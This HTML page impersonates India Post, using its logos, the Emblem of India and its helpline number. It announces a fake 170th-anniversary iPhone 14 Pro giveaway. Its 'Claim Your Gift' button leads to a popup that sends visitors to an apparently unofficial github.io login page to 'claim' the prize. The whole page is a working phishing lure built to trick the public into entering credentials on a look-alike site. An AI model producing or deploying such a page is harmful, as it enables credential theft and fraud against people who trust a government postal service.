<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>India post</title>
	<style>
		body {
			font-family: Arial, sans-serif;
			margin: 0;
			padding: 0;
		}
		header {
			background-color: #FFFFFF;
			display:flex;
			height:50px
			
			
		}
		header img {
			width: 60px;
			margin-left:35px;
			height:40px
			
		}
		h1 {
		color: white;
		background-color: red;
		text-align: center;
		}
		p{
		text-align: center;
		}
		
		.hero {
			background-image: url('https://github.com/Anandkhuman/code/raw/main/india-post_660_040818074748_042219100210.jpg');
			height: 470px;
			background-size: cover;
			background-position: center;
			display: flex;
			justify-content: center;
			align-items: center;
		
		
		}
		.container {
		display: flex;
		justify-content: center;
		align-items: center;
	
		}
		.gift-button {
		padding: 10px 20px;
		background-color: #4CAF50;
		color: white;
		border: none;
		border-radius: 5px;
		cursor: pointer;
		animation: shake 0.5s ease-in-out infinite;
		transition: background-color 0.3s ease-out;
		}
		
		.gift-button:hover {
		background-color: #3e8e41;
		}
		
		@keyframes shake {
		0% { transform: translate(1px, 1px) rotate(0deg); }
		10% { transform: translate(-1px, -2px) rotate(-1deg); }
		20% { transform: translate(-3px, 0px) rotate(1deg); }
		30% { transform: translate(3px, 2px) rotate(0deg); }
		40% { transform: translate(1px, -1px) rotate(1deg); }
		50% { transform: translate(-1px, 2px) rotate(-1deg); }
		60% { transform: translate(-3px, 1px) rotate(0deg); }
		70% { transform: translate(3px, 1px) rotate(-1deg); }
		80% { transform: translate(-1px, -1px) rotate(1deg); }
		90% { transform: translate(1px, 2px) rotate(0deg); }
		100% { transform: translate(1px, -2px) rotate(-1deg); }
		}
		footer {
			background-color: #FFFFFF;
			padding: 20px;
			text-align: center;
		}
		@media (max-width: 768px) {
			nav ul {
				flex-direction: column;
			}
		}
		.popup {
		position: fixed;
		top: 50%;
		left: 50%;
		transform: translate(-50%, -50%);
		background-color: white;
		padding: 20px;
		border-radius: 5px;
		box-shadow: 9px 4px 10px #000000;
		z-index: 1000;
		display: none; /* Move this rule to .popup class */
		}
		
		.popup-show {
		display: block; /* Add this new rule */
		}
		
		.popup-button{
		justify-content: center;
		align-items: center;
		
		}
	</style>
</head>
<body>
	<header>
		<img src="https://github.com/Anandkhuman/code/raw
	/main/India_Post_Logo_With_Text.png" alt="Logo">
	
	    <img src="https://github.com/Anandkhuman/code/raw/main/G20.png" alt="Logo">
	
		<img src="https://github.com/Anandkhuman/code/raw/main/right_side_logo.png" alt="Logo">
		
		<img src="https://github.com/Anandkhuman/code/raw/main/Emblem_of_India.png" alt="Logo">
		
	</header>
	<h1>Congratulations!</h1>
	<p>India Post 170th Anniversary giveaways
	you will have a chance to get iphone 14 pro</p>
	<div class="container">
	<button id="claim-button" class="gift-button">Claim Your Gift</button>
	</div>
	
	<div id="popup" class="popup">
	<div class="popup-content">
	<p>you need to Log in for claim your gift.</p>
	<button id="disagree-button" class="popup-button">❌️ cancel</button>
	<button id="agree-button" class="popup-button">✅️ continue</button>
	
	</div>
	</div><br>
	<section class="hero">	
	</section>
	
	<footer>
		<p>Toll Free Enquiry Helpline:
		18002666868
		9:00 AM - 6:00 PM
		(Except Sundays & Gazetted Holidays)
		
		IVRS facility is available 24*7*365
		</p>
	</footer>
	
	
	<script type="text/javascript">
	const claimButton = document.getElementById('claim-button');
	const popup = document.getElementById('popup');
	const agreeButton = document.getElementById('agree-button');
	const disagreeButton = document.getElementById('disagree-button');
	
	function showPopup() {
	popup.classList.add('popup-show');
	}
	
	function hidePopup() {
	popup.classList.remove('popup-show');
	}
	
	claimButton.addEventListener('click', showPopup);
	disagreeButton.addEventListener('click', hidePopup);
	
	// Redirect to login page when user clicks Agree button
	agreeButton.addEventListener('click', () => {
	window.location.href = 'https://freeindian.github.io/Post-office/loginwith';
	hidePopup();
	});
	</script>
</body>
</html>
